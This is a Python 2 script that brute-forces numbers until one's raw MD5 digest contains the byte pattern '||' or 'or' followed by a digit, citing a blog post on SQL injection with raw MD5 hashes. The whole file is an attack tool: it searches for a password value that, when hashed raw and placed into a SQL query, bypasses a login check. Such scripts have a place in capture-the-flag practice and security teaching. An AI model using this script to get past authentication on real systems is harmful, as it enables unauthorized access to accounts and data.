from concurrent.futures import ThreadPoolExecutor
import concurrent
import hashlib

# reference: http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
step = 100000
def get_md5_str(input_str):
    m = hashlib.md5()
    m.update(input_str)
    return m.digest()

def check_valid(hash_val):
    or_idx = hash_val.find("'||'")
    if or_idx == -1:
        or_idx = hash_val.find("'or'")
        if or_idx == -1:
            return False
    return hash_val[or_idx+4].isdigit()

def process(i):
    for idx in range(i, i+step):
        val = str(idx)
        hash_val = get_md5_str(val)
        if check_valid(hash_val):
            return idx
    

if __name__ == '__main__':
    curr = 129581926211651571912466741651878684928
    leap =  5*10**7
    stop = False
    with ThreadPoolExecutor() as executor:
        while True:
            print curr
            futures = [executor.submit(process, i) for i in range(curr, curr+leap, step)]
            curr+= leap
            print len(futures)
            for future in concurrent.futures.as_completed(futures):
                #print 'completed future'
                try:
                    res= future.result()
                    if res is not None:
                        print 'RESULT: '
                        print res
			stop = True
                except:
                    print 'EXCEPTION'
            if stop:
                break

